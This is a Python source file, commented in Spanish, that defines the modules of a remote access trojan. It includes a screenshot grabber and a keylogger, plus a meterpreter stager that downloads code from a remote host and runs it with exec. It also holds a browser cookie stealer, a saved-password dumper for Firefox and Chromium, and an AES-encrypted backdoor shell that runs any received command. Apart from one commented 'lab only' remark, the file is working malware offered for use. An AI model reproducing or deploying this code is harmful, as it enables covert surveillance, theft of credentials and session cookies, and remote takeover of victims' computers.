#!/usr/bin/python
"""
Este archivo define los modulos a ser utilizados en el RAT.

Los modulos seran importados a partir de este archivo.

Autores.
-Fernando Castaneda
-Diego Serrano

"""

def screenshot():
    import os
    os.system("import -window root /tmp/$(date +%F_%H%M%S_%N).png")

def meterpreter(srv,pto):
	import socket,struct
	s=socket.socket(2,1)
	s.connect((srv,pto))
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(4096)
	while len(d)!=l:
	    d+=s.recv(4096)
	exec(d,{'s':s})

def keylogger():
	import pyxhook
	#Es necesario el archivo pyxhook.py
	log='/tmp/cap'
	def OnKeyPress(event):
		f=open(log,'a')
		f.write(event.Key)
		f.write('\n')
		if event.Ascii==96:
			f.close()
			hook.cancel()
	hook=pyxhook.HookManager()
	hook.KeyDown=OnKeyPress
	hook.HookKeyboard()
	hook.start()

def cookies():
	#Es necesario tener instalado sqlite3 en el sistema
	import sqlite3
	import sys
	import glob
	def firefox():
		#Probado con ICEWEASEL
		for ruta in glob.glob(r'/home/*/.mozilla/firefox/*/cookies.sqlite'):
			conn=sqlite3.connect(ruta)
			for cookie in conn.execute("select * from moz_cookies;"):
				print cookie
	def chrome():
		#Funciona para chrome y chromium
		for ruta in glob.glob(r'/home/*/.config/*/Default/Cookies'):
			conn=sqlite3.connect(ruta)
			for cookie in conn.execute("select * from cookies;"):
				print cookie
	chrome()
	firefox()

def passwd():
	import ffpassdecrypt
	import glob
	import os
	def firefox():
		f=file('ff-pass','a')
		s=ffpassdecrypt.main()
		#f.write(str(s))
		#f.write('\n')
	def chrome():
		for ruta in glob.glob(r'/home/*/.config/chromium/Default/Login Data'):
			os.system(str("python chrome-password-export.py -i "+ruta+" -p -o chrome-pass"))
	chrome()
	firefox()

def backdoor(cliente,pto):
	from Crypto.Cipher import AES
	from Crypto import Random
	import socket
	import base64
	import os
	import subprocess
	import sys

	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
	secret = "6666666666ASDFGH"
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(secret, AES.MODE_CFB, iv)
	c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	c.bind((cliente,pto))
	c.listen(1)
	s, a = c.accept()
	s.send(EncodeAES(cipher, '''EN LINEA...
                (_)_(_)
                 (o o)
                  \o/	''' + secret))

	while True:
		data = s.recv(1024)
		decrypted = DecodeAES(cipher, data)
		if decrypted == "exit":
			break    	
		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = proc.stdout.read() + proc.stderr.read() + secret
		encrypted = EncodeAES(cipher, stdoutput)
		s.send(encrypted)
	s.close()
	sys.exit()

#def cifrar():
	#ADVERTENCIA: Usar solo en lab :'(


#screenshot()
#meterpreter()
#keylogger()
#cookies()
passwd()
#backdoor()